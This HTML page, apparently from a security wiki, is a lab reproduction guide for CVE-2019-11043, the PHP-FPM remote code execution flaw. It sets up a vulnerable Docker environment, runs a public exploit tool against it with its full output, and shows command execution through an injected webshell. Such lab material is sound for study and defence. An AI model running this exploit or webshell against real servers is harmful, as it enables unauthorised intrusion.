<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Php/CVE-2019-11043/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>PHP-FPM Remote Code Execution (CVE-2019-11043) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "PHP-FPM Remote Code Execution (CVE-2019-11043)", url: "#_top", children: [
              {title: "References", url: "#references" },
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        PHP-FPM 远程代码执行漏洞（CVE-2019-11043）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2018-19518/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2018-19518/README.zh-cn/" class="btn btn-xs btn-link">
        PHP IMAP 远程命令执行漏洞（CVE-2018-19518）
      </a>
    </div>
    
  </div>

    

    <h1 id="php-fpm-remote-code-execution-cve-2019-11043">PHP-FPM Remote Code Execution (CVE-2019-11043)<a class="headerlink" href="#php-fpm-remote-code-execution-cve-2019-11043" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>PHP-FPM is a FastCGI implementation for PHP. In PHP versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 in certain configurations of FPM setup it is possible to cause FPM module to write past allocated buffers into the space reserved for FCGI protocol data, thus opening the possibility of remote code execution.</p>
<p>This vulnerability was first discovered during the Real World CTF 2019 Quals (organized by Chaitin Tech). It affects Nginx servers with certain misconfigurations when working with PHP-FPM, the most common vulnerable configuration includes <code>location ~ [^/]\.php(/|$)</code> rules.</p>
<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
<ul>
<li>PHP Bug Report: <a href="https://bugs.php.net/bug.php?id=78599">https://bugs.php.net/bug.php?id=78599</a></li>
<li>Technical Analysis: <a href="https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/">https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/</a></li>
<li>Exploit Tool: <a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Start a vulnerable PHP-FPM 7.2.10 server with Nginx using the following command:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the environment starts, you can access the default page at <code>http://your-ip:8080/index.php</code>.</p>
<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
<p>The vulnerability can be exploited using the tool from <a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a>:</p>
<div class="highlight"><pre><span></span><code>$ go run . &quot;http://your-ip:8080/index.php&quot;
2019/10/23 19:41:00 Base status code is 200
2019/10/23 19:41:00 Status code 502 for qsl=1795, adding as a candidate
2019/10/23 19:41:00 The target is probably vulnerable. Possible QSLs: [1785 1790 1795]
2019/10/23 19:41:02 Attack params found: --qsl 1790 --pisos 152 --skip-detect
2019/10/23 19:41:02 Trying to set &quot;session.auto_start=0&quot;...
2019/10/23 19:41:02 Detect() returned attack params: --qsl 1790 --pisos 152 --skip-detect &lt;-- REMEMBER THIS
2019/10/23 19:41:02 Performing attack using php.ini settings...
2019/10/23 19:41:02 Success! Was able to execute a command by appending &quot;?a=/bin/sh+-c+&#39;which+which&#39;&amp;&quot; to URLs
2019/10/23 19:41:02 Trying to cleanup /tmp/a...
2019/10/23 19:41:02 Done!
</code></pre></div>
<p>The successful exploitation will be indicated by the output above:</p>
<p><img alt="" src="1.png" /></p>
<p>After the initial exploitation, a webshell is injected into the PHP-FPM process. You can execute commands by visiting:</p>
<div class="highlight"><pre><span></span><code>http://your-ip:8080/index.php?a=id
</code></pre></div>
<p>Example of successful command execution:</p>
<p><img alt="" src="2.png" /></p>
<h3 id="important-notes">Important Notes<a class="headerlink" href="#important-notes" title="Permanent link">&para;</a></h3>
<ol>
<li>The vulnerability affects only some of the PHP-FPM child processes. If a command doesn't execute on the first try, make multiple attempts to reach an affected process.</li>
<li>The success of the exploit depends heavily on the specific Nginx configuration. The most common vulnerable configuration includes:</li>
<li>FastCGI processing enabled</li>
<li>PHP files processed through PHP-FPM</li>
<li>Specific location rules that split URLs in a vulnerable way</li>
</ol>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        PHP-FPM 远程代码执行漏洞（CVE-2019-11043）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2018-19518/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2018-19518/README.zh-cn/" class="btn btn-xs btn-link">
        PHP IMAP 远程命令执行漏洞（CVE-2018-19518）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>